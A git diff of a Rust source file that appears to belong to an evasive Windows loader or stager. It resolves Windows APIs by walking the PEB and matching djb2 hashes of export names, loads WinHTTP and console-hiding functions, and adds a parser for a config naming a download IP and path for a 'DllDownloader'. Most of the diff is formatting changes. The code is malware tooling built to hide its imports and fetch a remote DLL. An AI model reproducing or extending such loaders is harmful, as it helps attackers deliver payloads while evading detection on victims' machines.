@@ -2,15 +2,15 @@
 #![allow(non_snake_case)]
 
 use alloc::string::{String, ToString};
-use alloc::{format, vec};
 use alloc::vec::Vec;
 use core::arch::asm;
 use core::ffi::{c_void, CStr};
 use core::mem::transmute;
 use core::ptr::{null, null_mut};
 use core::slice;
+
 use crate::core_link::bootstrapper::Instance::get_instance;
-use crate::core_link::bootstrapper::types::{DWORD, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS, LDR_DATA_TABLE_ENTRY, LIST_ENTRY, LoadLibraryAFn, PEB, WinHttpCloseHandleFn, WinHttpConnectFn, WinHttpOpenFn, WinHttpOpenRequestFn, WinHttpQueryDataAvailableFn, WinHttpReadDataFn, WinHttpReceiveResponseFn, WinHttpSendRequestFn};
+use crate::core_link::bootstrapper::types::{IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS, LDR_DATA_TABLE_ENTRY, LIST_ENTRY, LoadLibraryAFn, PEB, WinHttpCloseHandleFn, WinHttpConnectFn, WinHttpOpenFn, WinHttpOpenRequestFn, WinHttpQueryDataAvailableFn, WinHttpReadDataFn, WinHttpReceiveResponseFn, WinHttpSendRequestFn};
 use crate::core_link::bootstrapper::utils::{hash_djb2, HASH_GET_CONSOLE_WINDOW, HASH_LOAD_LIBRARY_A, HASH_SHOW_WINDOW, HASH_USER32, HASH_WIN_HTTP_CLOSE_HANDLE, HASH_WIN_HTTP_CONNECT, HASH_WIN_HTTP_OPEN, HASH_WIN_HTTP_OPEN_REQUEST, HASH_WIN_HTTP_QUERY_DATA_AVAILABLE, HASH_WIN_HTTP_READ_DATA, HASH_WIN_HTTP_RECEIVE_RESPONSE, HASH_WIN_HTTP_SEND_REQUEST, HASH_WINHTTP};
 
 /*
@@ -58,9 +58,9 @@ pub fn get_dll(hash_module: u32) -> *const c_void {
 }
 
 #[link_section = ".text$B"]
-pub fn get_func_api(dll_base: *const c_void, hash_func :u32) -> *const c_void {
+pub fn get_func_api(dll_base: *const c_void, hash_func: u32) -> *const c_void {
     unsafe {
-        let dos_header = dll_base as *const _ as  *const IMAGE_DOS_HEADER;
+        let dos_header = dll_base as *const _ as *const IMAGE_DOS_HEADER;
         let nt_headers = dll_base.offset((*dos_header).e_lfanew as isize) as *const IMAGE_NT_HEADERS;
         let export_directory_rva = (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress;
         if export_directory_rva == 0 {
@@ -81,19 +81,18 @@ pub fn get_func_api(dll_base: *const c_void, hash_func :u32) -> *const c_void {
             let name_va = dll_base.offset(name_rva as isize) as *const i8;
             let func_name_cstr = CStr::from_ptr(name_va).to_str().ok().unwrap();
 
-            if  hash_djb2(func_name_cstr) == hash_func {
+            if hash_djb2(func_name_cstr) == hash_func {
                 let ordinal_index = *ordinals_va.offset(i as isize) as isize;
                 let func_rva = *addresses_va.offset(ordinal_index);
                 let func_va = dll_base.offset(func_rva as isize);
                 return func_va;
             }
-
         }
     }
     unsafe { *null_mut() }
 }
 
-#[link_section=".text$z"]
+#[link_section = ".text$z"]
 #[macro_export]
 macro_rules! define_lazy_static_instance {
     ($name:ident, $type:ty, $init:expr) => {
@@ -121,13 +120,11 @@ pub fn load_lib(hash_module: u32) {
     if let Some(lib_name_str) = ins.hash_map.get(&hash_module) {
         unsafe {
             let dll_base = load_library(lib_name_str.clone().as_ptr() as *const i8);
-            if dll_base == null_mut() {
-            } else {
+            if dll_base == null_mut() {} else {
                 ins.win_api.libs.insert(hash_module, dll_base as *const c_void);
             }
         }
-    } else {
-    }
+    } else {}
 }
 
 
@@ -142,24 +139,55 @@ pub fn init() {
         name.iter().map(|&c| c as u8).collect::<Vec<u8>>()
     };
     ins.hash_map.insert(HASH_USER32, user32_name);
-    ins.hash_map.insert(HASH_WINHTTP,win_http);
+    ins.hash_map.insert(HASH_WINHTTP, win_http);
     load_lib(HASH_USER32);
     load_lib(HASH_WINHTTP);
     unsafe {
-        ins.win_api.load_func_addr(HASH_USER32,HASH_GET_CONSOLE_WINDOW);
-        ins.win_api.load_func_addr(HASH_USER32,HASH_SHOW_WINDOW);
-        ins.win_api.load_func_addr(HASH_WINHTTP,HASH_WIN_HTTP_OPEN);
-        ins.win_api.load_func_addr(HASH_WINHTTP,HASH_WIN_HTTP_CONNECT);
-        ins.win_api.load_func_addr(HASH_WINHTTP,HASH_WIN_HTTP_OPEN_REQUEST);
-        ins.win_api.load_func_addr(HASH_WINHTTP,HASH_WIN_HTTP_SEND_REQUEST);
-        ins.win_api.load_func_addr(HASH_WINHTTP,HASH_WIN_HTTP_RECEIVE_RESPONSE);
-        ins.win_api.load_func_addr(HASH_WINHTTP,HASH_WIN_HTTP_QUERY_DATA_AVAILABLE);
-        ins.win_api.load_func_addr(HASH_WINHTTP,HASH_WIN_HTTP_READ_DATA);
-        ins.win_api.load_func_addr(HASH_WINHTTP,HASH_WIN_HTTP_CLOSE_HANDLE);
+        ins.win_api.load_func_addr(HASH_USER32, HASH_GET_CONSOLE_WINDOW);
+        ins.win_api.load_func_addr(HASH_USER32, HASH_SHOW_WINDOW);
+        ins.win_api.load_func_addr(HASH_WINHTTP, HASH_WIN_HTTP_OPEN);
+        ins.win_api.load_func_addr(HASH_WINHTTP, HASH_WIN_HTTP_CONNECT);
+        ins.win_api.load_func_addr(HASH_WINHTTP, HASH_WIN_HTTP_OPEN_REQUEST);
+        ins.win_api.load_func_addr(HASH_WINHTTP, HASH_WIN_HTTP_SEND_REQUEST);
+        ins.win_api.load_func_addr(HASH_WINHTTP, HASH_WIN_HTTP_RECEIVE_RESPONSE);
+        ins.win_api.load_func_addr(HASH_WINHTTP, HASH_WIN_HTTP_QUERY_DATA_AVAILABLE);
+        ins.win_api.load_func_addr(HASH_WINHTTP, HASH_WIN_HTTP_READ_DATA);
+        ins.win_api.load_func_addr(HASH_WINHTTP, HASH_WIN_HTTP_CLOSE_HANDLE);
     }
-
 }
 
+pub struct Config<'a> {
+    pub(crate) ip: Option<&'a str>,
+    pub(crate) path: Option<&'a str>,
+}
+
+pub fn parse_toml(config: &str) -> Config {
+    let mut parsed_config = Config { ip: None, path: None };
+
+    for line in config.lines() {
+        let line = line.trim();
+        if line.is_empty() || line.starts_with('#') {
+            continue;  // 跳过空行和注释
+        }
+
+        if let Some((key, value)) = parse_key_value(line) {
+            match key {
+                "IP" => parsed_config.ip = Some(value.trim_matches('"')),
+                "PATH" => parsed_config.path = Some(value.trim_matches('"')),
+                _ => {}
+            }
+        }
+    }
+
+    parsed_config
+}
+
+fn parse_key_value(line: &str) -> Option<(&str, &str)> {
+    let mut parts = line.splitn(2, '=');
+    let key = parts.next()?.trim();
+    let value = parts.next()?.trim();
+    Some((key, value))
+}
 
 pub struct DllDownloader {
     pub(crate) dll_data: Vec<u8>,
